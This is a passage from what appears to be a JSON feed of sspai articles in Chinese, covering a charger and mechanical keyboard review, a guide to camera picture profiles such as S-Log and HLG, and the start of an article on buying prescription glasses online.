口充电时会有延迟（接入手机等设备会隔个几秒才开始充电）或波动（接入设备后充电时断时续，有时甚至不充电）等情况，但随着日常使用，完全冲不进去电的情况倒也并没有发生。</p>\n<p>还有一个对我个人而言算不上缺点，但有些读者可能会介意的地方：两个 USB-A 口，单口输出最大 18W；同时输出，两 USB-A 口相加最大只有 15W；如果是 A + C，则为 18W + 45W；如果三口同时输出，C + (A + A) 的功率为 45W + 15W。我个人对快充没有需求，MacBook Air 的话 45W 也完全足以喂满。所以如果对输出功率比较介意，建议慎重购买。</p>\n<p>为方便理解，输出功率组合情况见下表：</p>\n<figure class=\"table\"><table>\n<thead><tr>\n<th> </th>\n<th>+ 0</th>\n<th>+ USB-C</th>\n<th>+ USB-A1/A2</th>\n<th>+ USB-A1 + USB-A2</th>\n</tr></thead>\n<tbody>\n<tr>\n<td>USB-C</td>\n<td>65W</td>\n<td>-</td>\n<td>45W</td>\n<td>45W</td>\n</tr>\n<tr>\n<td>USB-A1</td>\n<td>18W</td>\n<td>18W</td>\n<td>共享 15W</td>\n<td>-</td>\n</tr>\n<tr>\n<td>USB-A2</td>\n<td>18W</td>\n<td>18W</td>\n<td>共享 15W</td>\n<td>-</td>\n</tr>\n</tbody>\n</table></figure><h2>@100gle: IQUNIX L-80 机械键盘 </h2>\n<ul>\n<li>入手渠道：京东自购</li>\n<li>参考价格：696 元</li>\n</ul>\n<p>上一次使用机械键盘还是在 2019 年，那时候我刚入手的还是机械键盘入门款的 iKBC C87 红轴。第一次接触机械键盘时会觉得手感和普通的薄膜键盘有那么些不一样，清脆有力的敲击以及回弹无不让我为机械键盘为之着迷。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/04/f150601154d909ebab7390455730ad32.png\"><figcaption>图源京东商城</figcaption></figure><p>但随着使用的时间比较长，加之我手头的 iKBC C87 这款机械键盘价格相对便宜，在敲击键盘的过程中容易产生金属碰撞时的那种「锵锵」的空腔回弹声，虽然在写文章敲代码时似乎并不影响我，但如果是在不戴降噪耳机遮蔽噪音的情况下还是相当恼人。</p>\n<p>所以没多久之后我就将手头的 iKBC C87 以半价的价格在闲鱼上售出回血，最后购置了一直用到现在的 68 键的宁芝静电容键盘 Plum。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/04/d030d4a71b8f97e27139e5983d6a978c.jpeg\"></figure><p>我经常性地将这款键盘来回带着上下班并使用，但也因为兼顾便携性，所以该键盘上所缺少的键位往往都需要通过组合键来实现，对于个人的心智以及肌肉记忆是个很大的挑战；加之后续我为了跟小伙伴们更好的「开黑」玩游戏，于是入手了联想的 R9000P 游戏本之后，但又不想每天都背着个键盘上下班，于是就在 618 的第二天（不要问我为什么不在 618 当天入手，<s>问就是突然想买</s>）入手了 IQUNIX 家的 L-80。</p>\n<p>IQUNIX 由称为「铝厂」，因为它家的设备大多数都以铝材为主。当然选购 IQUNIX L-80 当然主要还是因我觉得颜值还是不错的（没错，我为颜值买单）。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/04/afe356cd4f65088d65795df8b330ae8b.png\"><figcaption>图源京东商城</figcaption></figure><p>除了外观之外，L-80 也具备了大多数的机械键盘所具备的功能，比如：有线无线连接、二段式脚撑、全键无冲等之外，它让我比较满意的几个点在于：</p>\n<ul>\n<li>适配 MAC 键位（我是 Windows、macOS 和 Linux 三系统操作党）</li>\n<li>赶上手机的 4000mAh 电池容量即是在无线模式下也能使用很久</li>\n<li>出厂即是 PBT 键帽不容易打油</li>\n<li>支持热插拔轴体</li>\n</ul>\n<p>同时这次我也选购的是来自于国产的 TTC 金粉轴体，手感对比我之前的 iKBC C87 和目前的在用的宁芝 Plum 来说（以下为主观玄学体验环节）：</p>\n<ul>\n<li>反应更加灵敏，敲击对指尖的压力较小；</li>\n<li>按键清脆且回弹有力，感觉介于机械轴体与静电容轴之间。</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/04/ee17584b8b0d56eb1e81a78ab2038104.jpeg\"></figure><p>不过 L-80 也有一些小瑕疵的地方，比如在有线连接和无线连接之间切换时需要将键盘抬起并通过底部的开关进行切换，不如直接通过组合按键来得直接。</p>\n<p>并且，即便是在不打开脚撑的情况下，键盘自身的角度（目测在 20° 左右）及高度对手腕来说可能压力大一些，长时间最好需要配备一个腕托。</p>\n<p><strong>如果你也想分享「新玩意」🔉：</strong></p>\n<p>很多读者表示自己也有一些希望分享的有趣产品。为了能让更多读者参与，我们决定在「新玩意」栏目最后添加一个新的版块，邀请大家来 Matrix 社区发表文章分享你的「新玩意」，你只需要：</p>\n<ul>\n<li>在标题中标注「新玩意」</li>\n<li>用 500-1000 字介绍产品</li>\n<li>配上 1-2 张产品的实拍图片</li>\n<li><strong>在网站个人信息中补充支付宝账号</strong></li>\n</ul>\n<p>成功入选栏目还可以得到 108 元的「剁手抚恤金」🧧。如果你有兴趣参与，就赶紧来稿吧！</p>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号</a> ，了解更多的新玩意 🆒</p>\n<p>&gt; 特惠、好用的硬件产品，尽在 <a href=\"https://shop549593764.taobao.com/?spm=a230r.7195193.1997079397.2.2ddc7e0bPqKQHc\">少数派sspai官方店铺</a> 🛒</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68115"},{"title":"为了更好地给所摄视频调色，我整理了这份图像配置文件学习笔记","date":"2021-08-05 07:56:18","description":"\n<h3><strong>Matrix 首页推荐</strong></h3>\n<p><a href=\"https://sspai.com/matrix\">Matrix</a> 是少数派的写作社区，我们主张分享真实的产品体验，有实用价值的经验与思考。我们会不定期挑选 Matrix 最优质的文章，展示来自用户的最真实的体验和观点。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<hr>\n<h2>前言</h2>\n<p>无反相机的出现是革命性的。除了取景方式的改变，我觉得，用户感知更明显的是视频功能的下放。在无反相机兴起之前，视频录制对于普通人来说并不友好，但是随着无反相机的普及，带来的是越来越靠谱的对焦系统，以及丰富的图像配置文件选项（Picture Profile，简称PP），让用户有着更大的调色选择空间。</p>\n<p>最近我也在学习使用索尼微单进行视频的拍照，经过一段时间的使用，对索尼微单的视频设置功能有一定的了解。下面就把自己使用过程中的「笔记」分享给大家。</p>\n<p>虽然我以手上的索尼微单作为蓝本，但是和其他品牌的无反相机也有一定的相似之处，我会尝试总结一些比较共性的内容，让不同品牌的「股东们」都能够有所收获。</p>\n<h2>图像配置文件的位置</h2>\n<p>因为索尼相机菜单是出了名的难找。我就顺便给大家说一下图像配置文件的位置啦。</p>\n<p>有两个位置可以找到更改图像配置文件的地方：</p>\n<ol>\n<li>如果没有对图像配置文件所见的位置进行大幅度的更改，点击「Fn」按钮 - 点击「PP」按钮 - 在左侧界面选择PP值。我手头上的机器只有 10 个 PP 值，具体 PP 值代表的含义，需要点击「＞」按钮进入二级菜单，在菜单可以看到相对应的色域等信息。</li>\n<li>用户点击「Menu」按钮 - 点击「影像质量/影像尺寸1」- 翻到第 12 页，点击「图像配置文件」</li>\n</ol>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/33135d1b73096f8f95418afe4851055e.gif\"><figcaption>不同PP值能够对视频风格做出调整</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/02989aa86e86b8d0ff4cdd41df5fa9ef.jpg\"><figcaption>二级菜单可以对伽马、色彩模式（色域）进行调整</figcaption></figure><h2>图像配置文件存在的意义</h2>\n<p>在了解一系列的参数之前，我们要知道图像配置文件存在的意义。开门见山地说，图像配置文件的存在是为了我们在不同的使用条件下找到最适合自己的「视频风格预设」，提升自己的拍摄和后期编辑效率，并最终实现效果的最优化。比如说：</p>\n<p>如果你需要简单地记录生活，对记录的便捷性比较看中，你就可以直接选择以 Rec.709 的图像配置进行录制，曝光和对焦控制好，就可以即拍即用。</p>\n<p>如果你在拍摄视频作品，有比较高的调色需求，你就可以选择以 S-Log2 或者 S-Log3 的图像配置进录制，以期获得更大的后期调色空间。</p>\n<p>如果你对视频的调色还不是很熟悉，但是希望可以进行一点初级的调色，你可以选择 HLG 的图像配置进行录制，在实用性和时效性上取得一个平衡。</p>\n<p>当然，决定编辑效率和视频质量的因素不仅仅是图像配置文件，还需要对色深，色度采样，色彩空间（色域）进行一定的设置，才能达到最优的效果。</p>\n<h2>色深和色度采样</h2>\n<p>在我们了解色彩配置文件之前，我们需要先了解另外的两个概念：「色深」和「色度采样」。这两个概念其实很常见，也常常是一对出现的。当别人说，这台机器能够拍摄「8 bit 4:2:0」或者能拍摄「10 bit 4:2:2」的画面时，就是在描述这个相机的色深和色度采样。这两个数值一起来描述一台机器能够记录的颜色信息量的多少。</p>\n<h3>色深</h3>\n<p>指代的是红、绿、蓝三个通道里面，每个通道从正红色、正绿色、正蓝色渐变到正黑色所能容纳的灰度。（可以理解成黑色图层覆盖在通道上面，随着不透明度逐渐增加，最终变为全黑的过程）</p>\n<p>8 bit：每个通道能够容纳 2^8 （即 256 ）个灰度，使用 0 至 255 这 256 个整数进行记录。我们知道，在 RGB 的色彩世界里，任何颜色都可以通过红、绿、蓝三色混合叠加而成（如果没有某种颜色的参与，这种颜色的数值即为 0 ，三种颜色为 0 时，混合叠加即为黑色；三种颜色为 255 时，混合叠加即为白色）， 256^3 就是 8 bit 色深可以显示的色彩量，帮你算了，大概就是 1700 万种色彩。</p>\n<p>同理可得：</p>\n<p>10 bit：每个通道能够容纳 2^10 灰度值，即 1024 个灰度，一共可以展示超过 10 亿色。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/30/article/cd71f685de9afda7e19fa013ad3529d6\"><figcaption>8 bit 和 10 bit 色深的效果对比</figcaption></figure><p>这个就是 8 bit 和 10 bit 的差距，表现在实际拍摄中的直观感受为： 8 bit 在后期调色的时候，或者在拍摄一些具有渐变性质的画面（如日出或者日落时万里无云的天空，从橘黄色渐变为深蓝色）容易出现色彩的断层。断层出现的原因：A → B → C 的颜色渐变中，不能够通过 8  bit 的 RGB 关系来表达出颜色 B ，所以我们只能够记录到从颜色 A 到颜色 C 的渐变。而如果有 10 bit 的记录能力，这种情况可以大大缓解。</p>\n<p>当然，如果你还是需要使用 8 bit 来记录，也可以通过在画面增加颗粒效果来打破顺滑的颜色渐变，从而减少色彩断层出现的情况。</p>\n<h3>色度采样</h3>\n<p>指的是一种色彩的采样方式。一般来说，我们会对图片使用 RGB 进行信号传输，即使用红色通道、绿色通道、蓝色通道各自独立进行信号传输。但是视频为了更大地节省存储的空间（因为视频是由数量超多的一帧帧画面组成的，如果使用 RGB 的方式进行传输会非常占空间），采用另一种名为 LUV 的方式进行视频信号的记录。 L 代表明度， U 和 V 代表色度。</p>\n<p>研究人员发现，每个像素需要保留明度信息，但是色度信息可以通过好几个像素共享。我们说的 4:4:4，4:2:2，4:2:0 就是描述像素色度信息被保留（或者被丢弃）的程度，从左到右分别能记录从多到少的色度信息。一般民用的相机里，相对视频功能比较看重的设备会配置 4:2:2 的色度采样，而大部分相机都只能够记录 4:2:0 的色度信息。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/30/article/60676a43f1ca5eee2ada231857476e86\"><figcaption>三种色度采样的色彩信息量对比</figcaption></figure><p>现在很多标准的蓝光影片依然使用 8 bit 4:2:0 进行视频记录，一般记录生活的话， 4:2:0 也能用。但是如果我们想要进行二级调色，或者进行对画面的某样物体进行抠图，因为某些像素缺乏自己的色度信息，所以二级调色容易出现色块，抠图也难以抠得精细。</p>\n<p>需要提一下的是，原生提供 10 bit 4:2:2 视频录制功能的相机并不多，但是一些机器可以通过外接录机实现更高规格的视频录制。例如：</p>\n<p>索尼 a7m3 外录可以实现 8bit 4:2:2 的视频规格（原为 8 bit 4:2:0 ）</p>\n<p>富士 X-S10 外录可以实现 10bit 4:2:2 的视频规格（原为 8 bit 4:2:0 ）</p>\n<h2>图像配置文件</h2>\n<p>从上文我们知道，色深和色度采样很大程度上决定了画面中色彩信息的多少，而使用者为了获得更大的后期调整空间，在选择了高色深和高色度采样的文件规格后，往往会选择采用比较 Log 曲线进行记录，后期也诞生了 HLG 曲线标准。不同的图像配置文件，其实本质上不存在优劣之分，是长时间的影视实践中，针对不同的画面以及拍摄需求产生的不同图像配置文件。</p>\n<h3>色域与图像配置文件</h3>\n<p>一般来说，只是选定了图像配置文件还不够，必须要有合适对应的色域和图像配置文件一起使用。色域就是颜色可以显示的范围。我们经常可以看到一个马蹄状的彩色区域，不同色域的 R（红） G （绿） B （蓝）并不相同，把 RGB 三点连起来的三角形，就是某个色域的范围。</p>\n<p>某个视频的色域是怎么样的，具体取决于拍摄时设备设定的色域，但是最终的色彩结果也受我们观看这个视频的屏幕上的色域影响。单从视频播放来说，我们基本上看到的视频都是 Rec.709 （BT.709）色域的视频；一些配备有HDR播放功能的设备色域可能是 BT.2020 标准的；数字电影主要采用 DCI-P3 色域作为标准，由 Digital Cinema Initiatives 指定；我们拍摄视频时，为了获得最大的宽容度，索尼建议采用 S-Gamut3.Cine 或者 S-Gamut3.Cine 作为色域。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/30/article/09457e87508c1f4ff50f04b2d8b0172d\"><figcaption>不同色域的范围对比</figcaption></figure><p>如上文说到，因为设备规格的不统一，有可能存在拍摄的视频与观看视频色域不一样的情况出现。因为色域定义的是能够呈现的颜色的标准，如果色域不一样，那么就会出现同一种颜色在不同设备上显示不一致的情况出现（或者画面出现过灰或者过饱和的情况）。这个时候，我们就需要记得给色彩空间进行转换，即把一个色彩空间内的颜色映射到另一个色彩空间内，来维持色彩显示效果的统一。如果使用 DaVinci Resolve 进行调色，需要进行色彩空间转换，再进行个性化的二级调色。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/30/article/1be94519bfdf23db5f4a65a0b700b984\"><figcaption>DaVinci Resolve 的色彩空间转换功能，不过有人也喜欢灰灰的调调，这个看个人操作习惯</figcaption></figure><h3>比较常见的几个图像配置文件</h3>\n<h4>无</h4>\n<p>当你没有进行图像配置文件设置的时候，就是即拍即用的画面色彩。标准的画面色彩普通记录其实也完全可用，给用户免去了画面色彩校正再进行后期调色的步骤，能够满足大部分用户的需求。但是就像静态画面的 jpg ，本身能够记录的动态范围不大，在记录范围外的画面信息也没法通过后期处理找回来。</p>\n<p>如果实在需要使用标准的视频输出配置，可以稍微降低饱和度和锐度来稍微提升一些宽容度，同时画面也会变得柔和一些观感会好上不少。</p>\n<h4>Log</h4>\n<p>Log 曲线是一种为了让相机能够记录更多信息的伽马曲线。</p>\n<p>伽马曲线可以理解为：画面信息从全黑到全白可映射为一条 45° 的直线，但是感光材料的特性，在显示器中呈现一条曲线，为了抵消感光材料带来的失真，需要绘制一条相反的曲线，这就是伽马曲线大致的形态。伽马曲线有很多种，但是基本都是这种形态：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/30/article/1ccb5395e501e0ee24edc6fb6f201269\"><figcaption>CRT曲线特性是往下凹陷，视频曲线需要通过中间上拱来抵消变化</figcaption></figure><p>Log 曲线为了记录更多的信息，本质上是通过对可能过曝或者欠曝丢失细节的高光和阴影信息压缩到中间调区域，为此，对 Log 曲线进行了优化。如对曲线的底部和顶部增加膝点（Knee point）调整曲线的倾斜率，从而改变画面的对比度。所以未经校正的 Log 文件画面会看起来发灰发白，但是可以看到阴影和高光确实比 Rec.709 的画面有更多的细节。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/30/article/16c8157bc85ea466794aecbeaec583fa\"><figcaption>膝点校正</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/30/article/5cfa22a0f7ce5d8aed11d42408419189\"><figcaption>和 Rec.709 相比， S-Log 能够容纳更多的亮度信息</figcaption></figure><p>很多厂商都有自己的 Log 曲线（如索尼的 S-Log ，佳能的 C-Log ，尼康的 N-Log ，松下的 V-Log ），但是因为厂商的色彩管理思路不一样，所以各自的伽马曲线斜率并不一致（有的倾向保留高光，有的倾向保留暗部信息），不同厂商之间的曲线很难匹配。</p>\n<p>以索尼微单为例，索尼提供 S-Log2 和 S-Log3 两种 Log 曲线。肉眼上看， S-Log3 比 S-Log2 更灰一些，更亮一些，按照<a href=\"https://www.sony.com.sg/electronics/support/articles/00145908\" target=\"_blank\">索尼官方文档</a>的说法， S-Log2 在中间调到高光的过渡层次更好， S-Log3 在阴影到中间调的表现更好。</p>\n<p>但是因为 S-Log2 本身饱和度没有 S-Log3 那么低，所以对调色的要求也没有 S-Log3 那么强，对于大部分的 8 bit 4:2:0 的相机来说比较友好，不容易出现断层，所以一般建议 10 bit 4:2:2 的设备如 a7s3 使用 S-Log3 曲线，其他的机器可以先体验体验 S-Log2 是否能满足需求，然后再考虑使用 S-Log3。</p>\n<p>同时，因为S-Log的起始 ISO 比较高（800起跳），它的原理是提亮暗部和压暗亮部到中间调，暗部很容易出现明显的噪点。所以为了保持画面的纯净度，有一个「向右曝光」的规则，就是在保证画面没有大面积过曝的同时，尽可能让直方图的画面向右「亮部」曝光，让中间调和暗部也有足够的亮度信息，配合斑马纹（过曝区域会出现黑白相间的斑马纹）使用可以获得更精确的对焦。但是为了方便，我个人会直接选择在曝光补偿中选择+2 档，这样拍摄起来过程会更流畅些。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/ecd7cf2612624bbea21b7b149d44c79d.gif\"><figcaption>通过斑马纹能精确判断过曝范围</figcaption></figure><h4>HLG</h4>\n<p>HLG 的全称是 Hybrid Log-Gamma （混合对数伽码），是由英国 BBC 广播公司与日本放送协会 NHK 共同开发的“数位节目放送” HDR 标准，于 2015 年 5 月推出。出于商业保密原则，每个公司的 Log 都会有自己标准，造成后期难以匹配视频素材风格， HLG 作为一个通用标准，能够更容易进行不同设备拍摄素材的匹配。</p>\n<p>对于普通的用户来说， HLG 也更加易用。 HLG 里的 Hybrid ，指的是： HLG 在暗部和中间调使用了类似 Rec.709 的伽马曲线，高光部分使用了类似 Log 的伽马曲线，既让画面不会看起来太灰，增加可用性，又让高光信息得到了更好的保留。</p>\n<blockquote><p>HLG 模式一共有有四种，包括 HLG 、 HLG1 、 HLG2 、 HLG3 。HLG 是国际规定的标准，而 HLG1 、 HLG2 、 HLG3 则是索尼相机优化的版本。其中 HLG1 在这些曲线中拥有最好的降噪性能，但总体动态范围较窄，而 HLG3 拥有宽动态范围，但噪声较大。而 HLG2 则处于中间，性能比较均衡。HLG2 的最低 ISO 为 125 起跳，远低于 S-Log 的 800 ，也可以获得更纯净的画面。</p></blockquote>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/30/article/2e85a953e66e95ef1bac544918eae501\"><figcaption>HLG 信号曲线和 Rec.709信号曲线对比，可以看到 HLG 能更好地保护高光</figcaption></figure><h2>结语</h2>\n<p>最后总结一下不同图片文件配置各自的使用范围：</p>\n<p>Rec.709：日常使用，基本不需要额外调色，调色空间也少</p>\n<p>S-Log：有比较大的调色范围，对调色水平要求较高</p>\n<p>HLG：日常使用和调色空间比较好的平衡，可以直出，也可以自行调色。</p>\n<p>今天尝试给大家（也是给我自己）做了一个总结，在前期拍摄的时候，根据特性如何找到最合适自己的图像配置文件。前期拍摄是录制视频的第一步，选择适合的图像配置文件有利于获得后期更大的调整空间，让画面呈现出更好的效果。希望大家都能够拍摄出好视频啦。</p>\n<hr>\n<p>封面来自<a href=\"https://unsplash.com/photos/sXia-d6iYAg\">Unsplash</a></p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/67997"},{"title":"你也可以配一副适合自己的眼镜：线上配镜的经验与实践","date":"2021-08-05 06:47:21","description":"\n<p>作为一个多年的近视眼，眼镜早已成为我生活中不可分割的一部分，十几年来，几乎都是起床就戴上、睡觉才摘下，自然到甚至很难意识到眼镜的存在。不过，正因为对于大部分近视的人来说，眼镜都是长期朝夕相处的事物，配备一副更好的镜片就显得更加重要。</p>\n<p>在配新眼镜时，有几天的适应期是正常的，但由于人眼确实具备一定的可塑性，即使是配备得不那么准确的镜片，在一段时间之后也会被人眼适应，这就导致在长期的时间尺度上，「正常适应新镜片」和「妥协性适应不合适的镜片」经常会让人难以分清。而在适应之后，长期使用不合适的镜片不但不能起到足够的矫正和辅助作用，还会进一步伤害使用者的视力。</p>\n<p>上个月，我因为旧眼镜的镜腿损坏送去维修，临时去 JINS 配了一副备用眼镜，戴上之后才意识到，老的镜片虽然价格和质量都比备用眼镜的高，但因为多年使用带来的老化和划痕，此时实际的视野已经远不如新的备用镜清晰了。因此，我决定在眼镜修好之后，给它好好换一副新镜片。当然，对于预算充足的消费者来说，直接去大型连锁眼镜店挑贵的就可以解决问题了，但我自己还是打算在保证质量的前提下，尽可能便宜的达到目的。</p>\n<p>经过一番研究，我最后成功的通过线下验光和测量镜架数据，并在电商下单镜片并寄送装配的方式成功地用比较优惠的价格配到了一副合适的镜片。在这篇文章中，我会分享我做的一些功课和实际的操作思路，希望可以为广大戴眼镜的朋友提供一些参考。</p>\n<h2>如何选购价廉物美的镜架及镜片</h2>\n<p>「眼镜是个暴利行业」这句话似乎一直以来都深入人心，包括我自己，在配眼镜的时候都会下意识地把它当作一个常识。而丹阳眼镜城、潘家园等地方性产业中心、1688 等电商批发渠道中与实体眼镜店标价悬殊的差距似乎也佐证了这个论断。但实际情况确实如此吗？我觉得需要分情况看。</p>\n<h3>镜架：想要性价比，关键在渠道</h3>\n<p>在镜架方面，如果你想追求「超级性价比」，那丹阳、深圳等主要产地具有绝对的价格优势。以江苏丹阳为例，丹阳是中国的主要眼镜产地之一，镜架年产量约占全国的三分之一。相对于镜片来说，镜架的技术含量比较低，根据 <a href=\"https://tv.cctv.com/2020/09/11/VIDE54QdabINhbFdItd1w8r3200911.shtml\">央视《正点财经》栏目 2020 年的报道</a>，丹阳一副镜架的出厂价在 30 至 80 元区间内，即使是纯钛材质的镜架，也只要 80 元左右。因此，如果有条件可以直接前往镜架产地（事实上，丹阳的「配镜游」已经成为了当地的一个标志性产业，在网上也有许多关于专程从外地去丹阳购买眼镜的文章），在几十元到一百多元这个区间，买到一副质量合格的镜架是没有问题的。</p>\n<p>但同时也应注意到，丹阳眼镜虽然产量极大，但仍然以中低端产品为主，并且这样非常逼近成本的售价几乎是只有在产地才可以成立的。换句话说，<strong>如果在其它渠道看到这样价位的镜架，那么它们有更大的概率会是质量不合格的产品或是长期库存的产品。</strong></p>\n<p>如果你的预算在此之上，对镜架的要求更高，例如一些特殊的材料和设计（例如 Lindberg 的无铰链设计或者 Silhouette 的超轻钛质镜架），或者喜欢更精致的手工制品（例如日本的一大批手工作坊品牌），那么通过正规渠道购买品牌产品仍然是更加合适的选择。</p>\n<h3>镜片：买片虽易，验光却不简单</h3>\n<p>对于镜片来说，根据上文央视报道，丹阳出品的镜片出厂价大约在 30 元左右，在网上许多配镜经验帖子中，在当地许多店铺甚至是买镜架送镜片的——这大约也是「能用的镜片」的价格下限。不可否认，倘若加工得当、质量过关，便宜的国产镜片在今天已经足以承担普通人日常使用的需求，不用担心会对视力不利，明月、万新等国产镜片品牌近年来也已经在市场上取得了不错的口碑。</p>\n<p>但是，如果追求价格上的极致的便宜，那么你所需要付出的时间精力和承担的风险就会不可避免地增加。<strong>对于普通的连锁眼镜店来说，镜架和镜片其实并不是主要的成本，真正的大头是人工和房租。</strong>在验光、挑选、加工、装配、试戴、售后的整个配镜流程中，物料也只是其中的一环而已。而眼镜作为一个准医学设备，其它的服务性环节也是非常重要的，<strong>哪怕买了最好的镜架和镜片，如果加工不当、验光不准，对佩戴者的视力也是有害无益</strong>。一家合格的眼镜店会配备专业的验光设备、人员以及完善的售后，这些无疑会增加配镜的成本，但对于让你配到一副合适的眼镜也是必不可少的。</p>\n<p>微博博主 @dkdvip 的视频《<a href=\"https://m.weibo.cn/1235178820/4663305916126646\" target=\"_blank\">眼镜是不是暴利行业？</a>》详细说明了实体店配镜的成本构成和服务的必要性，并认为线上配镜不可行。我认为，在预算足够的情况下，靠谱的实体店确实比线上要可靠许多，但是在如今许多配镜环节可以标准化的现在，我们仍然可以通过把重要的验光测量环节在线下完成、把装配、购买等更流程化的环节转移到线上来降低成本。</p>\n<p>从网上的一些配镜体验文章中也可以看出，对于丹阳等主打性价比的眼镜城，其优势主要是价格实惠、（镜架）款式丰富，而缺点主要是验光随意、事后发现装配不准甚至装配有瑕疵、买到长期库存商品或者货不对版、价格不透明（例如流传很广的「一定要找个说当地方言的朋友一起去才不会被坑」的说法）、售后麻烦甚至无售后（特别是对于从外地前往配镜的情况）等等。就镜片而言，目前绝大多数的眼镜片都为树脂材质，而与我们平时常见的玻璃材质不同，树脂眼镜片无论质量好坏，都是会随着时间老化而出现发黄、镀膜老化等情况，算是某种程度上的易耗品，因此，如果买到库存镜片，即使镜片本身出厂质量合格，也相当于变相给使用寿命打了折扣。</p>\n<h3>想要配到合适的镜片，这些因素不可忽视</h3>\n<p>成品眼镜片在出厂时是圆形或者椭圆形的镜片，需要经过加工之后装配到眼镜上之后，镜片的购买流程才算完成。镜片最主要的组成部分是坯片和镀膜，其中，坯片基材的供应商相对集中，无论是什么品牌、价位的镜片，1.6 折射率以上的基材通常都来自日本三井、韩国 KOC 等少数几家供应商，并且坯片本身以中国生产为主，因此，在这个环节，可以认为不同品牌的镜片差别不大。</p>\n<p>配过眼镜的朋友对于折射率这个属性应该都不陌生，镜片的折射率直接由基材决定，主流的树脂镜片有 1.5、1.6、1.67、1.74 几种，折射率越高，度数相同的镜片就越薄，价格也越贵。但是，并非越薄就一定越好，一般来说，折射率越高的镜片，阿贝数<sup class=\"ss-footnote\" href=\"\" title=\"阿贝数指的是色散系数，阿贝数越高的镜片成像会越清晰，如果是从事设计等对于眼镜的色彩表现有较高要求的职业，在配镜时最好留意一下阿贝数。\" footnote-id=\"1\">1</sup>就越低，镜片密度也会变高，也许会出现够买更高折射率的镜片反而导致整幅眼镜变重的情况。<strong>高度近视者为了控制镜片的厚度，可能会需要选择更高的折射率，而中低度数者即使预算充足，也不必一味追求高折射率，选择适合自己的就好。</strong>一般来说，对于非高度近视（600 度以内）的配镜者而言，1.6 折射率是光学性能、厚度和价格平衡得最好的了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/31/a6703e621e9b0a0d9852102a8d5c84cf.png\"><figcaption>高低阿贝数成像对比</figcaption></figure><p>我们接触到的镜片品牌（蔡斯、依视路、尼康、明月、万新等），基本上都是出于产业链中游的企业，即对坯片进行不同的面型加工和镀膜，生产出成品镜片的厂商。而镀膜与面型，也正是市面上不同档次的镜片的主要差别和各大品牌的竞争力所在。本文的主要目的并非镜片科普，因此对于技术细节不作过多深入，但一些基本的事实是：面型加工有球面、内非球面、外非球面、双非球面、自由曲面等技术，<strong>使用的技术越高端（双非&gt;内非&gt;外非&gt;球面，非球面中：自由曲面&gt;非自由曲面），同样度数和折射率的镜片就可以越轻薄，光学性能也越好（例如镜片边缘的视觉变型会越小，视野更大），价格也越昂贵</strong>。采用自由曲面技术的镜片，可以根据个人的情况，利用精密车床对镜片进行个性化打磨，进而获得更加匹配个人情况的光学性能。也因为加工比较复杂，这种技术一般都是使用在价格较高的定制型镜片中。</p>\n<p>需要注意的是，定制镜片本质上是在打磨镜片时，在近视度数、散光、瞳距等常规验光可以获得的数据基础上，增加一些使用者的个性化参数，这其中有些是人眼的参数，例如单眼瞳距、脸部倾斜角和年龄，也有需要配合镜架的参数，例如眼睛和镜片的距离、镜片倾斜角。<strong>只有准确测量了所需的参数，定制才有意义</strong>，否则如果使用默认数据的话，就和非定制镜片没有区别了，因为非定制镜片本身就是根据平均数据设计的。在线下实体的配镜时，商家通常都会帮忙测量好所有所需的数据，但许多用户为了便宜在电商下单，却没有提供相应的数据，而很多商家嫌麻烦没有提醒（反正也不是不能用），结果就导致花了更多的钱买了定制款，却只得到了和非定制款一样的效果。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/31/d8d0a95eb0ef01222587b8ea36cf4089.png\"><figcaption>蔡司产品册上的镜片定制参数要求</figcaption></figure><p>而膜层主要影响的是镜片的一些光学以外的性能，例如防水防油、防静电防尘、防紫外线、耐磨、防蓝光、提升视野的明亮度、降低反射等等，各家镜片厂商都有自己特有的镀膜，有些也提供各种功能的膜层的自行选择和组合，在经历疫情爆发之后，一些厂商甚至推出了 <a 